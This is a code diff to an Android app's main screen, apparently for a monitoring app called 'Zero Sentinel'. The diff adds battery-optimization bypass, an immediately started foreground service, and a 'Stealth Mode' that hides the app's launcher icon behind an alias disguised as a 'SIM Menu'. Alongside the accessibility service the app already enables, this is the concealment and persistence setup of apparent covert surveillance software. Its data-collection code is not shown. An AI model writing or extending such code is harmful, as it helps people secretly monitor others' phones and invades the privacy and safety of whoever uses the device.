@@ -13,10 +13,18 @@ import androidx.appcompat.app.AppCompatActivity
 import com.zero.sentinel.R
 import com.zero.sentinel.services.SentinelAccessibilityService
 
+import android.content.ComponentName
+import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.PowerManager
+import android.view.View
+
 class MainActivity : AppCompatActivity() {
 
     private lateinit var statusText: TextView
     private lateinit var enableButton: Button
+    private lateinit var batteryButton: Button
+    private lateinit var stealthButton: Button
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -24,19 +32,31 @@ class MainActivity : AppCompatActivity() {
 
         statusText = findViewById(R.id.tv_status)
         enableButton = findViewById(R.id.btn_enable_accessibility)
+        batteryButton = findViewById(R.id.btn_ignore_battery)
+        stealthButton = findViewById(R.id.btn_enable_stealth)
 
+        // 1. Accessibility
         enableButton.setOnClickListener {
             if (!isAccessibilityServiceEnabled()) {
                 val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                 intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                 startActivity(intent)
-                
-                // Show simple toast guide
                 Toast.makeText(this, "Find 'Zero Sentinel' and enable it.", Toast.LENGTH_LONG).show()
-            } else {
-                Toast.makeText(this, "Service already active!", Toast.LENGTH_SHORT).show()
             }
         }
+
+        // 2. Battery Optimization
+        batteryButton.setOnClickListener {
+            requestBatteryOptimization()
+        }
+
+        // 3. Stealth Mode
+        stealthButton.setOnClickListener {
+            enableStealthMode()
+        }
+        
+        // Start Foreground Service immediately if possible
+        startService(Intent(this, com.zero.sentinel.services.SentinelService::class.java))
     }
 
     override fun onResume() {
@@ -45,15 +65,23 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun updateStatus() {
+        // Check Accessibility
         if (isAccessibilityServiceEnabled()) {
-            statusText.text = "System Monitor Status: ACTIVE"
             enableButton.isEnabled = false
-            enableButton.text = "Service Enabled"
+            enableButton.text = "Service Enabled ✅"
         } else {
-            statusText.text = "System Monitor Status: Inactive"
             enableButton.isEnabled = true
-            enableButton.text = "Enable Accessibility Service"
         }
+
+        // Check Battery
+        if (isIgnoringBatteryOptimizations()) {
+            batteryButton.isEnabled = false
+            batteryButton.text = "Battery Ignored ✅"
+        } else {
+            batteryButton.isEnabled = true
+        }
+
+        statusText.text = "Setup Status: ${if (enableButton.isEnabled) "Incomplete" else "Ready"}"
     }
 
     private fun isAccessibilityServiceEnabled(): Boolean {
@@ -65,5 +93,41 @@ class MainActivity : AppCompatActivity() {
             }
         }
         return false
+    }
+
+    private fun isIgnoringBatteryOptimizations(): Boolean {
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        return pm.isIgnoringBatteryOptimizations(packageName)
+    }
+
+    private fun requestBatteryOptimization() {
+        if (!isIgnoringBatteryOptimizations()) {
+            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+            intent.data = Uri.parse("package:$packageName")
+            startActivity(intent)
+        }
+    }
+
+    private fun enableStealthMode() {
+        val pm = packageManager
+        val componentName = ComponentName(this, MainActivity::class.java)
+        val aliasName = ComponentName(this, "com.zero.sentinel.ui.StealthAlias")
+
+        // Enable Alias (SIM Menu)
+        pm.setComponentEnabledSetting(
+            aliasName,
+            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+            PackageManager.DONT_KILL_APP
+        )
+
+        // Disable Main Activity (Zero Sentinel)
+        pm.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
+
+        Toast.makeText(this, "Stealth Mode Activated. App will close.", Toast.LENGTH_LONG).show()
+        finish()
     }
 }
